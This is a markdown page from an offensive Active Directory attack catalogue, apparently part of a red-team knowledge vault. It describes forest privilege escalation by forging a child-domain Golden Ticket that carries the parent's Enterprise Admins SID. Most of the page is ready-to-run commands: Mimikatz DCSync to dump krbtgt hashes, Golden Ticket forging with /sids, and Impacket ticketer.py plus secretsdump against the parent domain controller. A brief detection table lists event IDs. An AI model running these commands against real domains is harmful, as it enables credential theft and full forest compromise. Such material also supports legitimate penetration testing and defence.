---
title: "Attack #68 — Cross-Domain Trust Abuse (SID History)"
description: "In AD forests with multiple domains connected by trust relationships, compromising one child domain gives a path to the forest root domain. By forging a…"
category: active-directory
tags: ["active-directory", "kerberos", "credential-access", "privilege-escalation", "hashing"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Nine/🔶 Attack #68 — Cross-Domain Trust Abuse (SID History).md"
---
# 🔶 Attack #68 — Cross-Domain Trust Abuse (SID History)

***

## 📖 How It Works

In AD forests with multiple domains connected by **trust relationships**, compromising one child domain gives a path to the forest root domain. By forging a Golden Ticket in the child domain and injecting the **Enterprise Admins SID** from the parent domain into the ticket's `sIDHistory` field (via the `ExtraSids` PAC field), the attacker gains Enterprise Admin privileges across the entire forest.

This works because **parent-child trust is bidirectional and transitive by default**, and SID filtering is **NOT** enforced on inter-domain trusts within the same forest.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **KRBTGT hash of child domain** | Obtained via DCSync in child domain |
| **Child domain SID** | Domain SID of compromised child |
| **Enterprise Admins SID** | Typically the forest root domain SID + `-519` |

***

## 💻 Full Commands

```powershell
# ── Get child domain KRBTGT hash ─────────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:child.corp.local /user:krbtgt" exit

# ── Get parent domain SID ─────────────────────────────────────────────────────
Get-ADDomain -Identity corp.local | Select DomainSID
# S-1-5-21-<parent_SID>
# Enterprise Admins = S-1-5-21-<parent_SID>-519

# ── Forge Golden Ticket with parent EA SID ────────────────────────────────────
kerberos::golden /user:Administrator /domain:child.corp.local \
  /sid:S-1-5-21-<child_SID> /krbtgt:<child_krbtgt_hash> \
  /sids:S-1-5-21-<parent_SID>-519 /ptt
# The /sids parameter injects Enterprise Admins SID into ExtraSids PAC field

# ── Access parent domain as Enterprise Admin ──────────────────────────────────
dir \\PARENT-DC.corp.local\C$
lsadump::dcsync /domain:corp.local /user:krbtgt
```

```bash
# ── Impacket — forge ticket with extra SID ────────────────────────────────────
ticketer.py -nthash <child_krbtgt_hash> \
  -domain-sid S-1-5-21-<child_SID> \
  -domain child.corp.local \
  -extra-sid S-1-5-21-<parent_SID>-519 \
  Administrator

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@PARENT-DC.corp.local
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log (DC) | TGS request from child domain for parent domain resources |
| **4624** | Security Log | Logon with Enterprise Admin SID in token but no EA group membership |

***

## 🔗 Attack Chain Context

```
[Cross-Domain Trust] ──→ Child Domain → Enterprise Admin in entire forest
         │
         ├──→ 🔗 Golden Ticket /sids = ExtraSids SID injection
         ├──→ ⚠️ SID filtering NOT enforced within forest trusts
         └──→ 💀 Defeated by: SID filtering on external trusts, selective auth
```

***

> ✅ **Attack #68 — Cross-Domain Trust Abuse complete.**
